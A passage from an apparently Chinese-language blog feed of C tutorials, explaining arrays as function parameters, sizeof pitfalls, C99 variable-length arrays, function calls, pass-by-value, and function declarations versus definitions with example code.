&lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        arr2[i] *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arr2 in print_arr:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arr in main:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call print_arr():\n&quot;</span>);</span><br><span class="line">    print_arr(arr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after call print_arr(),arr in main:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111151641994.png" alt="image-20231111151641994" style="zoom:50%;" /><p>显然我们可以看到main()函数中的arr数组<code>也受到了影响</code>.</p><br><p>上面的例子中可以看出,数组作为函数形参,并不会为整个数组生成一个副本(如果不理解请回看<code>函数参数的按值传递</code>),而是会以某种方式将实参&quot;映射&quot;过来,这就意味着在print_arr()中对形参arr各元素的修改,实际上修改的是main()函数中的数组arr的各元素.</p><p>事实上,print_arr()中根本就没有一个新的数组,仅仅是存在一个<code>指向arr数组首元素的指针</code>,这个指针就是arr2!</p><p>这里简单地抛出这个重要区别,读者一定注意!这和一般的参数不同.</p><br><p>想要解释这个问题,需要后续学习指针后才能进行讨论,这里可以记住:<code>对于函数形参而言,传递数组就是在传递指针,而不是复制整个数组</code>.</p><h3 id="数组的长度信息">数组的长度信息</h3><p>还有一个重要的事情,我们知道利用sizeof()可以计算数组的大小:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,len); <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>sizeof(arr)</code>计算出arr数组的总长度(字节数),然后除以arr每一个元素的长度<code>sizeof(arr[0])</code>,就算出了数组的大小(元素个数)<code>len</code>.</p><br><p>但是放到函数参数这里就不再成立:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_arr_len</span><span class="params">(<span class="type">int</span> arr2[<span class="number">10</span>])</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr2) / <span class="keyword">sizeof</span>(arr2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len = get_arr_len(arr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len); <span class="comment">// 运行结果是错误的 2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原因很简单,函数形参arr2实际上是一个指针,而不是数组.</p><p>x64(我的环境是64位)的指针变量(int*)占用8个字节,而每一个元素(int)占用4个字节,两者相除结果就是2.</p><p>这就导致结果是错误的,所以,我们在对一个函数传递一个数组时,需要手动使用另外一个变量去传递数组的长度.</p><p>另一方面,尽管我们写了<code>int arr2[10]</code>,但是这里的<code>10</code>被直接无视(实际上其可以被省略).原因一样,arr2只是一个指针.</p><br><p>我们要写一个函数输出一个数组的所有元素,但事先不知道其长度,可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如上所述,这里直接将10省略掉,使用另外一个形参len手动指定</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr2[],<span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    print_arr(arr,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231111153149707.png" alt="image-20231111153149707" style="zoom:50%;" /><h2 id="可以返回一个数组">可以返回一个数组?</h2><p>和数组形参同理,返回值也是不可能返回一个完整的数组副本的.同样,如果写<code>return arr2;</code>,返回的将是一个指针.</p><p>而且提前告知一句:返回一个指针的函数,一定要确保指针不为NULL,或者没有指向某些意想不到的地方,例如该函数的某个局部变量,在函数返回后这个局部变量就被销毁了!</p><p><code>指针</code>,<code>指针与数组的关系</code>比较复杂,会在后面进行讲解.</p><h2 id="c99-变长数组形式参数">C99-变长数组形式参数</h2><h3 id="变长数组-vla">变长数组(VLA)</h3><p>前面讲解数组时提到,数组变量的长度必须使用<code>常量表达式</code>给出,而在新标准C99中(其实已经不新,写这篇文章时已经更新到C23),也可以使用非常量表达式.这样的数组叫做<code>变长数组(VLA)</code>.</p><p>我们使用<code>变长数组</code>可以自定义数组的长度,而不是必须进行<code>动态内存分配</code>.</p><p>下面是一个例子,用于存储并输出1~n:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 存储并输出1~n</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        arr[i] = i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变长数组函数形参">变长数组函数形参</h3><p>C99同时增加了几个与数组型参数相关的特性.</p><p>VLA作为函数形参,往往用于传递高维数组,因为高维数组必须确定第1维之后的各维的长度.</p><p>我们在传递二维数组形参时,可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 第二维不可省略!,第一维,即需要输出几行,显式地使用另外一个参数给出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">print_arr2d</span><span class="params">(<span class="type">int</span> arr[][<span class="number">4</span>],<span class="type">int</span> row)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;row;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">3</span>][<span class="number">4</span>]=&#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    print_arr2d(arr,<span class="number">3</span>); <span class="comment">// 输出这个二维数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是一旦main()中的数组列数发生变化,例如变成了5,程序就会发生错误.</p><p>C99的变长数组函数形参解决了这个问题,我们可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// row和col两个参数必须在arr之前给出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">print_arr2d</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> col, <span class="type">int</span> arr[row][col])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; col; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    print_arr2d(<span class="number">3</span>, <span class="number">4</span>, arr); <span class="comment">// 这样写的话,print_arr2d()函数即可适用于任何大小的二维数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>本部分讲解了初学者能遇到的大部分函数问题,不过二维数组参数仍然没有讲解清楚,我会将相关的所有内容放到指针这一大篇章.</p><br><br><p>上一篇:<a href="../2023-11-01-def693eb5bf8">C语言教程-12_2-深入分析函数和面向过程初识</a></p><p>下一篇:<a href="../2023-11-17-10666f346238">C语言教程-13_1-初识指针</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_2-深入分析函数和面向过程初识</title>
      <link href="/2023-11-01-def693eb5bf8/"/>
      <url>/2023-11-01-def693eb5bf8/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>分析C函数的调用过程与参数传递</li><li>分析函数声明与定义的区别</li><li>分析C函数与数学函数的区别</li><li>了解面向过程</li></ol><p>前置知识:</p><ol><li>了解C函数的基本结构</li></ol><p>注:尽管看起来过度分块,但是为了更加清晰地突出内容,还是分出了许多的标题,望理解.</p><h1 id="深入分析c函数">深入分析C函数</h1><h2 id="c函数的调用过程">C函数的调用过程</h2><p>上一部分已经讲解了C函数的基本结构,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;返回值类型&gt; &lt;标识符(函数名)&gt;(形参列表)&#123;</span><br><span class="line">    <span class="comment">// 代码块</span></span><br><span class="line">    <span class="keyword">return</span> 返回值; <span class="comment">// 可选的return 语句.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且知道在一个函数A中调用一个函数B(假设B的声明是这样:<code>int B(int a);</code>)只需要这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 其它代码</span></span><br><span class="line">    <span class="type">int</span> a2 = B(<span class="number">3</span>); <span class="comment">// 向B传递一个3作为实参,返回一个int值赋值给a2</span></span><br><span class="line">    <span class="comment">// 其它代码</span></span><br><span class="line">    <span class="comment">// A返回值为void,所以不需要返回任何值,我们将会在后面讲解到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来详细讲解.</p><h3 id="使用函数-函数调用-主调函数与被调函数">使用函数-函数调用,主调函数与被调函数</h3><p>仍然是使用计算平方的这个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>函数调用</p><p>我们前面仅仅是定义了一个函数f,和数学一样,我们需要使用特定的<code>参数</code>(自变量)去使用f进行求值.</p><p>调用一个函数,需要使用到函数调用表达式,只需要使用要调用的函数名,并在后面跟一个小括号,里面按顺序填写需要传递的特定参数:<code>&lt;函数名&gt;(需要传递的参数列表)</code></p><p>例如在main()函数中,第11行<code>x2 = f(x);</code>这条语句中,就调用了f(x),用于求x的平方,并且直接将<code>f(x)</code>赋值给x2,因为函数表达式的值就是这个函数的<code>返回值</code>.</p></li><li><p>主调函数与被调函数</p><p>这是两个概念,需要了解.</p><p><code>主调函数</code>就是调用的发起者,也就是<code>调用方</code>.这里就是main()函数,他调用了f()函数.</p><p>被调函数就是被调用的一方,也就是<code>被调用方</code>,这里就是f()函数,因为他被main()函数调用了.</p></li><li><p>函数调用的位置</p><p>函数调用可以出现在主调函数任何需要使用值的位置,前提是被调函数有返回值—如果一个函数的返回值为<code>void</code>,那么他没有返回值.</p><p>例如,我们可以直接将f(x)传递给printf(),而无需多此一举赋值给x2:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,f(x)); <span class="comment">// 没有任何必要再引入一个x2来浪费时间和空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然,在调用一个函数并使用其值时,一定要注意参数类型和返回值类型的匹配!否则可能引发报错,甚至更严重的是,导致一些意想不到的结果.</p></li></ul><h3 id="参数问题-形参和实参">参数问题-形参和实参</h3><p>接下来就要讨论一个重要问题,即函数的参数.</p><p>我们可以看到,在main()函数中,函数调用是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x2 = f(x);</span><br></pre></td></tr></table></figure><p>但是我们看f(x)的声明(函数声明即仅给出函数头,并在最后加上;):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>;</span><br></pre></td></tr></table></figure><p>可以看到有两个<code>x</code>,事实上这两个x并不是一个东西.</p><p><code>int x2 = f(x);</code>中的x,是main()函数中的局部变量,我们仅仅是将这个x的值作为参数传递(复制其值)给f().这里的x叫做<code>实际参数(实参)</code>,也就是真正的参数值.</p><p><code>int f(int x);</code>中的x,是为了指明f()函数的一个参数,它配合着函数体中的代码,来构成一个完整的函数,自身并没有值,需要主调函数为其传递一个特定值.这个x叫做形式参数(形参),它需要等待传入一个实参值并复制给他.</p><p>这里我们就可以大胆猜测(事实上前面已经有代码这么做),调用f()的时候,实参列表中的各个实参完全不必要和形参名一一对应,<code>我们仅仅关心实参的值</code>!</p><p>这就又牵扯出一个关键点:<code>C函数的一切参数传递全部都是按值传递!</code></p><p>下面进行讲解:</p><h3 id="按值传递">按值传递</h3><p>考虑一个问题,如果我在f()中对形参x进行修改,那么main()中的实参x(或者是任何变量)的值会不会同步地发生变化?看代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">x++;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">10</span>, x2;</span><br><span class="line">x2 = f(x);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x=%d,x2=%d&quot;</span>, x, x2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231104143147714.png" alt="image-20231104143147714" style="zoom:50%;" /><p>显然,main()函数中的x并没有发生变化,这意味着,使用x调用f(),仅仅是将main()函数中的变量x的值,也就是10,传递给f()函数,并将这个值&quot;赋值给&quot;f()中的形参x.</p><p>在f()中对形参x的任何操作都不会影响到main()中的x.</p><p>换言之,这两个x除了调用时进行了值的复制外,再没有任何关系!</p><h3 id="return语句和返回值">return语句和返回值</h3><p>return语句用于结束一个函数,并且它还负责返回一个计算好的返回值.</p><p>在f()中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>return y;</code>代表着两件事:</p><ol><li><p>这个函数结束运行!</p><p>无论return后面还有没有其他语句,都要立即结束这个函数!这也意味着return并不是必须为最后一条语句.</p></li><li><p>将y作为返回值返回给主调函数!</p><p>这里的y可以替换为任意表达式,但是必须和<code>函数类型(函数的返回值类型)</code>相同或者可以转化为返回值类型!</p><p>例如我们可以直接这样写:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x; <span class="comment">// x*x是一个表达式,两个int相乘,结果仍为int,和返回值类型相匹配</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>此外,返回值类型和参数类型完全不必要完全相同,完全任意.<code>f()</code>仅仅是作为一个例子而已.</p><h2 id="函数声明-函数原型与函数定义">函数声明,函数原型与函数定义</h2><p>先放结论:</p><p>有关这些概念性问题,容易混淆,本人这里更倾向于这一种观点:</p><p><code>函数原型</code>,<code>函数定义</code>,都属于<code>函数声明</code>的一种,现代的C语言都统一使用<code>函数原型式的风格</code>对其进行统一.</p><p>我们在使用一个函数之前,即进行函数调用之前,都必须知道这个函数的相关信息,包括<code>函数名,函数参数个数,函数参数类型,函数返回值类型</code>,这些信息显然,在我们实现一个函数f()时,都已经给出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显然这是一个完整的函数声明(包括了函数体)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且这一部分都放在了main()函数之前.我们尝试改变一下f()的位置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码会产生一个警告(注意并不是错误),原因是没有找到f()这个函数的声明.换言之,编译器此时在第5行的位置之前,并未找到有关f()的任何信息,它并不认识这个函数,更谈何调用.</p><p>解决方法很简单,在调用之前加上一个<code>声明</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// int f(int x); // 或者放在这里也可以的,并且&#x27;函数类型声明&#x27;可以重复</span></span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span 